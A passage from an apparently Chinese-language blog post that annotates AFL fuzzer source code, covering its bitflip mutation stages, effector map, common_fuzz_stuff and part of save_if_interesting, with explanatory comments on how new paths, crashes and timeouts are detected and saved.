class="line">stage_cycles[STAGE_FLIP1] += stage_max;                   <span class="comment">/* 执行次数 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ===== 阶段2：两个连续位翻转 ===== */</span></span><br><span class="line">stage_name = <span class="string">&quot;bitflip 2/1&quot;</span>;  <span class="comment">/* 每次翻转2位，步长1位 */</span></span><br><span class="line">stage_short = <span class="string">&quot;flip2&quot;</span>;</span><br><span class="line">stage_max = (len &lt;&lt; <span class="number">3</span>) - <span class="number">1</span>;  <span class="comment">/* 总位数-1（因为每次翻转2位） */</span></span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = stage_cur &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 翻转两个连续的位 */</span></span><br><span class="line">    FLIP_BIT(out_buf, stage_cur);</span><br><span class="line">    FLIP_BIT(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 恢复 */</span></span><br><span class="line">    FLIP_BIT(out_buf, stage_cur);</span><br><span class="line">    FLIP_BIT(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 统计 */</span></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">stage_finds[STAGE_FLIP2] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP2] += stage_max;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ===== 阶段3：四个连续位翻转 ===== */</span></span><br><span class="line">stage_name = <span class="string">&quot;bitflip 4/1&quot;</span>;  <span class="comment">/* 每次翻转4位，步长1位 */</span></span><br><span class="line">stage_short = <span class="string">&quot;flip4&quot;</span>;</span><br><span class="line">stage_max = (len &lt;&lt; <span class="number">3</span>) - <span class="number">3</span>;  <span class="comment">/* 总位数-3 */</span></span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = stage_cur &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 翻转四个连续的位 */</span></span><br><span class="line">    FLIP_BIT(out_buf, stage_cur);</span><br><span class="line">    FLIP_BIT(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line">    FLIP_BIT(out_buf, stage_cur + <span class="number">2</span>);</span><br><span class="line">    FLIP_BIT(out_buf, stage_cur + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 恢复 */</span></span><br><span class="line">    FLIP_BIT(out_buf, stage_cur);</span><br><span class="line">    FLIP_BIT(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line">    FLIP_BIT(out_buf, stage_cur + <span class="number">2</span>);</span><br><span class="line">    FLIP_BIT(out_buf, stage_cur + <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 统计 */</span></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">stage_finds[STAGE_FLIP4] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP4] += stage_max;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ===== Effector Map（效应图）相关宏定义 =====</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">   效应图用于标记哪些字节对程序执行路径有影响</span></span><br><span class="line"><span class="comment">   为了节省内存，使用了缩放因子 EFF_MAP_SCALE2（默认为3）</span></span><br><span class="line"><span class="comment">   即每8个字节共享效应图中的一个条目</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 将文件偏移转换为效应图索引</span></span><br><span class="line"><span class="comment">   例：EFF_MAP_SCALE2=3时，偏移0-7映射到索引0，8-15映射到索引1 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFF_APOS(_p) ((_p) &gt;&gt; EFF_MAP_SCALE2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 计算偏移在效应图条目中的余数 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFF_REM(_x) ((_x) &amp; ((1 &lt;&lt; EFF_MAP_SCALE2) - 1))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 计算存储长度为_l的数据需要的效应图条目数</span></span><br><span class="line"><span class="comment">   加上 !!EFF_REM(_l) 是为了处理不能整除的情况（向上取整） */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFF_ALEN(_l) (EFF_APOS(_l) + !!EFF_REM(_l))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 计算从位置_p开始、长度为_l的序列跨越的效应图条目数 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFF_SPAN_ALEN(_p, _l) (EFF_APOS((_p) + (_l) - 1) - EFF_APOS(_p) + 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 初始化效应图 */</span></span><br><span class="line">eff_map = ck_alloc(EFF_ALEN(len));  <span class="comment">/* 分配效应图内存 */</span></span><br><span class="line">eff_map[<span class="number">0</span>] = <span class="number">1</span>;                     <span class="comment">/* 第一个条目总是标记为有效 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 标记最后一个条目（如果不是第一个） */</span></span><br><span class="line"><span class="keyword">if</span> (EFF_APOS(len - <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    eff_map[EFF_APOS(len - <span class="number">1</span>)] = <span class="number">1</span>;</span><br><span class="line">    eff_cnt++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ===== 阶段4：字节级位翻转（翻转整个字节） ===== </span></span><br><span class="line"><span class="comment">   这个阶段同时构建效应图</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">stage_name = <span class="string">&quot;bitflip 8/8&quot;</span>;  <span class="comment">/* 每次翻转8位（1字节），步长8位 */</span></span><br><span class="line">stage_short = <span class="string">&quot;flip8&quot;</span>;</span><br><span class="line">stage_max = len;              <span class="comment">/* 操作每个字节 */</span></span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = stage_cur;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 翻转整个字节（相当于异或0xFF） */</span></span><br><span class="line">    out_buf[stage_cur] ^= <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 效应图分析 =====</span></span><br><span class="line"><span class="comment">       检查这个字节的翻转是否影响执行路径</span></span><br><span class="line"><span class="comment">       如果翻转后路径不变，说明这个字节是&quot;无效&quot;的</span></span><br><span class="line"><span class="comment">       后续的确定性变异阶段可以跳过这些无效字节以节省时间</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (!eff_map[EFF_APOS(stage_cur)]) &#123;  <span class="comment">/* 如果还未标记为有效 */</span></span><br><span class="line"></span><br><span class="line">      u32 cksum;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 特殊情况处理：</span></span><br><span class="line"><span class="comment">         - dumb模式：不做效应分析，全部标记为有效</span></span><br><span class="line"><span class="comment">         - 文件太短（&lt; EFF_MIN_LEN，默认128）：全部标记为有效</span></span><br><span class="line"><span class="comment">         否则计算实际的路径校验和 */</span></span><br><span class="line">      <span class="keyword">if</span> (!dumb_mode &amp;&amp; len &gt;= EFF_MIN_LEN)</span><br><span class="line">        cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        cksum = ~queue_cur-&gt;exec_cksum;  <span class="comment">/* 故意设置不同值 */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 如果路径发生变化，标记这个位置为有效 */</span></span><br><span class="line">      <span class="keyword">if</span> (cksum != queue_cur-&gt;exec_cksum) &#123;</span><br><span class="line">        eff_map[EFF_APOS(stage_cur)] = <span class="number">1</span>;</span><br><span class="line">        eff_cnt++;  <span class="comment">/* 有效条目计数 */</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 恢复原值 */</span></span><br><span class="line">    out_buf[stage_cur] ^= <span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ===== 效应图密度检查 =====</span></span><br><span class="line"><span class="comment">   如果超过90%（EFF_MAX_PERC）的条目都是有效的，</span></span><br><span class="line"><span class="comment">   那么跳过的收益很小，不如全部标记为有效</span></span><br><span class="line"><span class="comment">   这样可以避免后续阶段频繁检查效应图</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span> (eff_cnt != EFF_ALEN(len) &amp;&amp;</span><br><span class="line">    eff_cnt * <span class="number">100</span> / EFF_ALEN(len) &gt; EFF_MAX_PERC) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(eff_map, <span class="number">1</span>, EFF_ALEN(len));  <span class="comment">/* 全部标记为有效 */</span></span><br><span class="line">    blocks_eff_select += EFF_ALEN(len);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    blocks_eff_select += eff_cnt;  <span class="comment">/* 只统计实际有效的 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">blocks_eff_total += EFF_ALEN(len);  <span class="comment">/* 总条目数 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 统计 */</span></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">stage_finds[STAGE_FLIP8] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP8] += stage_max;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ===== 阶段5：双字节位翻转 ===== */</span></span><br><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_bitflip;  <span class="comment">/* 文件太短，跳过 */</span></span><br><span class="line"></span><br><span class="line">stage_name = <span class="string">&quot;bitflip 16/8&quot;</span>;  <span class="comment">/* 翻转16位，步长8位（1字节） */</span></span><br><span class="line">stage_short = <span class="string">&quot;flip16&quot;</span>;</span><br><span class="line">stage_cur = <span class="number">0</span>;</span><br><span class="line">stage_max = len - <span class="number">1</span>;  <span class="comment">/* 最多到倒数第二个字节 */</span></span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 效应图优化：如果两个字节都无效，跳过 */</span></span><br><span class="line">    <span class="keyword">if</span> (!eff_map[EFF_APOS(i)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="number">1</span>)]) &#123;</span><br><span class="line">      stage_max--;  <span class="comment">/* 调整总数以保持进度准确 */</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 翻转16位（2字节）</span></span><br><span class="line"><span class="comment">       注意：使用指针类型转换直接操作2字节 */</span></span><br><span class="line">    *(u16 *)(out_buf + i) ^= <span class="number">0xFFFF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    stage_cur++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 恢复 */</span></span><br><span class="line">    *(u16 *)(out_buf + i) ^= <span class="number">0xFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 统计 */</span></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">stage_finds[STAGE_FLIP16] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP16] += stage_max;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_bitflip;  <span class="comment">/* 文件太短，跳过32位翻转 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ===== 阶段6：四字节位翻转 ===== */</span></span><br><span class="line">stage_name = <span class="string">&quot;bitflip 32/8&quot;</span>;  <span class="comment">/* 翻转32位，步长8位 */</span></span><br><span class="line">stage_short = <span class="string">&quot;flip32&quot;</span>;</span><br><span class="line">stage_cur = <span class="number">0</span>;</span><br><span class="line">stage_max = len - <span class="number">3</span>;  <span class="comment">/* 最多到倒数第四个字节 */</span></span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">3</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 效应图优化：如果四个字节都无效，跳过 */</span></span><br><span class="line">    <span class="keyword">if</span> (!eff_map[EFF_APOS(i)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="number">1</span>)] &amp;&amp;</span><br><span class="line">        !eff_map[EFF_APOS(i + <span class="number">2</span>)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="number">3</span>)]) &#123;</span><br><span class="line">      stage_max--;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 翻转32位（4字节） */</span></span><br><span class="line">    *(u32 *)(out_buf + i) ^= <span class="number">0xFFFFFFFF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    stage_cur++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 恢复 */</span></span><br><span class="line">    *(u32 *)(out_buf + i) ^= <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 统计 */</span></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">stage_finds[STAGE_FLIP32] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP32] += stage_max;</span><br><span class="line"></span><br><span class="line">skip_bitflip:</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 如果设置了no_arith标志，跳过算术变异阶段 */</span></span><br><span class="line"><span class="keyword">if</span> (no_arith)</span><br><span class="line">    <span class="keyword">goto</span> skip_arith;</span><br></pre></td></tr></table></figure><p>首先是一个宏定义</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLIP_BIT(_ar, _b)                                                      \</span></span><br><span class="line"><span class="meta">  do &#123;                                                                         \</span></span><br><span class="line"><span class="meta">    u8 *_arf = (u8 *)(_ar);                                                    \</span></span><br><span class="line"><span class="meta">    u32 _bf = (_b);                                                            \</span></span><br><span class="line"><span class="meta">    _arf[(_bf) &gt;&gt; 3] ^= (128 &gt;&gt; ((_bf) &amp; 7));                                  \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>这个宏的功能是在ar这个字节的b位置反，从最高位开始算起，可以跨字节寻找,</p><p>首先先开始单字节翻转，这里for循环遍历每一位，我们这里可以看到为什么要在前面尽可能的缩小文件的大小了，要不然这里会花费巨量的时间。修改out_buf的该位，然后调用<code>common_fuzz_stuff(argv, out_buf, len)</code>来执行变异后的测试用例，检查是否发现新路径或崩溃。</p><h4 id="common-fuzz-stuff"><a href="#common-fuzz-stuff" class="headerlink" title="common_fuzz_stuff"></a>common_fuzz_stuff</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">EXP_ST u8 <span class="title">common_fuzz_stuff</span><span class="params">(<span class="keyword">char</span> **argv, u8 *out_buf, u32 len)</span> </span>&#123;</span><br><span class="line">  u8 fault;  <span class="comment">/* 存储执行结果（正常/崩溃/超时等） */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 后处理器支持 =====</span></span><br><span class="line"><span class="comment">     允许用户定义自定义的输入转换函数</span></span><br><span class="line"><span class="comment">     例如：解压、解码、格式转换等 */</span></span><br><span class="line">  <span class="keyword">if</span> (post_handler) &#123;</span><br><span class="line">    <span class="comment">/* 调用用户定义的后处理函数</span></span><br><span class="line"><span class="comment">       注意：len通过指针传递，可能被修改 */</span></span><br><span class="line">    out_buf = post_handler(out_buf, &amp;len);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 如果后处理失败（返回NULL或长度为0），</span></span><br><span class="line"><span class="comment">       跳过这个测试用例 */</span></span><br><span class="line">    <span class="keyword">if</span> (!out_buf || !len)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 写入测试文件 =====</span></span><br><span class="line"><span class="comment">     将变异后的数据写入临时文件，供目标程序读取 */</span></span><br><span class="line">  write_to_testcase(out_buf, len);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 执行目标程序 =====</span></span><br><span class="line"><span class="comment">     运行被测程序，返回执行结果：</span></span><br><span class="line"><span class="comment">     - FAULT_NONE: 正常执行</span></span><br><span class="line"><span class="comment">     - FAULT_TMOUT: 超时</span></span><br><span class="line"><span class="comment">     - FAULT_CRASH: 崩溃</span></span><br><span class="line"><span class="comment">     - FAULT_ERROR: 执行错误 */</span></span><br><span class="line">  fault = run_target(argv, exec_tmout);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 中断处理 =====</span></span><br><span class="line"><span class="comment">     如果用户按下Ctrl+C，立即停止 */</span></span><br><span class="line">  <span class="keyword">if</span> (stop_soon)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 超时处理 =====</span></span><br><span class="line"><span class="comment">     避免陷入连续超时的测试用例 */</span></span><br><span class="line">  <span class="keyword">if</span> (fault == FAULT_TMOUT) &#123;</span><br><span class="line">    <span class="comment">/* 连续超时计数器增加 */</span></span><br><span class="line">    <span class="keyword">if</span> (subseq_tmouts++ &gt; TMOUT_LIMIT) &#123;</span><br><span class="line">      <span class="comment">/* 超过限制（默认250次），放弃这个测试用例</span></span><br><span class="line"><span class="comment">         避免在容易超时的输入上浪费时间 */</span></span><br><span class="line">      cur_skipped_paths++;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* 不是超时，重置连续超时计数器 */</span></span><br><span class="line">    subseq_tmouts = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 用户跳过请求处理 =====</span></span><br><span class="line"><span class="comment">     用户可以发送SIGUSR1信号请求跳过当前输入 */</span></span><br><span class="line">  <span class="keyword">if</span> (skip_requested) &#123;</span><br><span class="line">    skip_requested = <span class="number">0</span>;      <span class="comment">/* 清除标志 */</span></span><br><span class="line">    cur_skipped_paths++;      <span class="comment">/* 统计跳过数 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;                 <span class="comment">/* 放弃当前输入 */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 保存有趣的输入 =====</span></span><br><span class="line"><span class="comment">     这是AFL的核心：判断这个输入是否&quot;有趣&quot;</span></span><br><span class="line"><span class="comment">     </span></span><br><span class="line"><span class="comment">     save_if_interesting会：</span></span><br><span class="line"><span class="comment">     1. 检查是否发现新路径（通过trace_bits）</span></span><br><span class="line"><span class="comment">     2. 检查是否触发崩溃（fault == FAULT_CRASH）</span></span><br><span class="line"><span class="comment">     3. 如果有趣，保存到队列或崩溃目录</span></span><br><span class="line"><span class="comment">     4. 处理FAULT_ERROR（无法执行目标程序）</span></span><br><span class="line"><span class="comment">     </span></span><br><span class="line"><span class="comment">     返回值添加到queued_discovered（新发现的队列项） */</span></span><br><span class="line">  queued_discovered += save_if_interesting(argv, out_buf, len, fault);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 定期更新界面 =====</span></span><br><span class="line"><span class="comment">     避免界面长时间不更新，让用户知道程序在运行 </span></span><br><span class="line"><span class="comment">     </span></span><br><span class="line"><span class="comment">     更新条件：</span></span><br><span class="line"><span class="comment">     1. 每执行stats_update_freq次（默认1次）</span></span><br><span class="line"><span class="comment">     2. 或者当前阶段的最后一次执行 */</span></span><br><span class="line">  <span class="keyword">if</span> (!(stage_cur % stats_update_freq) || stage_cur + <span class="number">1</span> == stage_max)</span><br><span class="line">    show_stats();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 返回0表示继续处理下一个变异 */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先检查用户是否设置了自定义的后处理函数，如果有则调用，然后把程序写入临时文件，既out_file。后面比较重要的就是save_if_interesting函数，我们详细看看</p><h5 id="save-if-interesting"><a href="#save-if-interesting" class="headerlink" title="save_if_interesting"></a>save_if_interesting</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u8 <span class="title">save_if_interesting</span><span class="params">(<span class="keyword">char</span> **argv, <span class="keyword">void</span> *mem, u32 len, u8 fault)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 *fn = <span class="string">&quot;&quot;</span>;        <span class="comment">/* 文件名 */</span></span><br><span class="line">  u8 hnb;            <span class="comment">/* has_new_bits的返回值 */</span></span><br><span class="line">  s32 fd;            <span class="comment">/* 文件描述符 */</span></span><br><span class="line">  u8 keeping = <span class="number">0</span>, res; <span class="comment">/* keeping: 是否保存标志 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 正常模式：寻找新路径 ===== </span></span><br><span class="line"><span class="comment">     crash_mode在正常模式下为FAULT_NONE */</span></span><br><span class="line">  <span class="keyword">if</span> (fault == crash_mode) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检查是否发现新的代码覆盖</span></span><br><span class="line"><span class="comment">       virgin_bits记录未执行过的路径 */</span></span><br><span class="line">    <span class="keyword">if</span> (!(hnb = has_new_bits(virgin_bits))) &#123;</span><br><span class="line">      <span class="comment">/* 没有新路径 */</span></span><br><span class="line">      <span class="keyword">if</span> (crash_mode)</span><br><span class="line">        total_crashes++;  <span class="comment">/* 崩溃模式下统计总崩溃数 */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;          <span class="comment">/* 不保存 */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 有新路径！构造队列文件名 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SIMPLE_FILES</span></span><br><span class="line">    <span class="comment">/* 详细文件名格式：id:000001,src:000000,op:flip1,pos:0 */</span></span><br><span class="line">    fn = alloc_printf(<span class="string">&quot;%s/queue/id:%06u,%s&quot;</span>, out_dir, queued_paths,</span><br><span class="line">                      describe_op(hnb));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">/* 简单文件名格式：id_000001 */</span></span><br><span class="line">    fn = alloc_printf(<span class="string">&quot;%s/queue/id_%06u&quot;</span>, out_dir, queued_paths);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 添加到fuzzing队列 */</span></span><br><span class="line">    add_to_queue(fn, len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hnb=2 表示发现了新的路径（不只是命中次数变化） */</span></span><br><span class="line">    <span class="keyword">if</span> (hnb == <span class="number">2</span>) &#123;</span><br><span class="line">      queue_top-&gt;has_new_cov = <span class="number">1</span>;  <span class="comment">/* 标记有新覆盖 */</span></span><br><span class="line">      queued_with_cov++;           <span class="comment">/* 统计有新覆盖的队列项 */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 计算并保存执行路径的校验和 */</span></span><br><span class="line">    queue_top-&gt;exec_cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 校准新测试用例</span></span><br><span class="line"><span class="comment">       确定执行的稳定性，更新位图分数等 */</span></span><br><span class="line">    res = calibrate_case(argv, queue_top, mem, queue_cycle - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">      FATAL(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将测试用例写入磁盘 */</span></span><br><span class="line">    fd = open(fn, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line">    ck_write(fd, mem, len, fn);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    keeping = <span class="number">1</span>;  <span class="comment">/* 标记已保存 */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 处理特殊执行结果 ===== */</span></span><br><span class="line">  <span class="keyword">switch</span> (fault) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> FAULT_TMOUT:</span><br><span class="line">    <span class="comment">/* ===== 超时处理 ===== */</span></span><br><span class="line">    </span><br><span class="line">    total_tmouts++;  <span class="comment">/* 总超时计数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 限制保存的超时样本数量（默认500个） */</span></span><br><span class="line">    <span class="keyword">if</span> (unique_hangs &gt;= KEEP_UNIQUE_HANG)</span><br><span class="line">      <span class="keyword">return</span> keeping;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dumb_mode) &#123;</span><br><span class="line">      <span class="comment">/* 简化执行路径，便于比较</span></span><br><span class="line"><span class="comment">         将路径计数简化为桶值 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line">      simplify_trace((u64 *)trace_bits);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      simplify_trace((u32 *)trace_bits);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 检查是否是新的超时模式 */</span></span><br><span class="line">      <span class="keyword">if</span> (!has_new_bits(virgin_tmout))</span><br><span class="line">        <span class="keyword">return</span> keeping;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unique_tmouts++;  <span class="comment">/* 注意：这里应该是unique_hangs++ */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 验证是否真的超时 ===== </span></span><br><span class="line"><span class="comment">       用更长的超时时间重新执行，排除偶然超时 */</span></span><br><span class="line">    <span class="keyword">if</span> (exec_tmout &lt; hang_tmout) &#123;</span><br><span class="line"></span><br><span class="line">      u8 new_fault;</span><br><span class="line">      write_to_testcase(mem, len);</span><br><span class="line">      new_fault = run_target(argv, hang_tmout);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 特殊情况：增加超时后发现崩溃</span></span><br><span class="line"><span class="comment">         这种情况按崩溃处理 */</span></span><br><span class="line">      <span class="keyword">if</span> (!stop_soon &amp;&amp; new_fault == FAULT_CRASH)</span><br><span class="line">        <span class="keyword">goto</span> keep_as_crash;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 如果不再超时，说明是偶然的，不保存 */</span></span><br><span class="line">      <span class="keyword">if</span> (stop_soon || new_fault != FAULT_TMOUT)</span><br><span class="line">        <span class="keyword">return</span> keeping;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 构造超时文件名 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SIMPLE_FILES</span></span><br><span class="line">    fn = alloc_printf(<span class="string">&quot;%s/hangs/id:%06llu,%s&quot;</span>, out_dir, unique_hangs,</span><br><span class="line">                      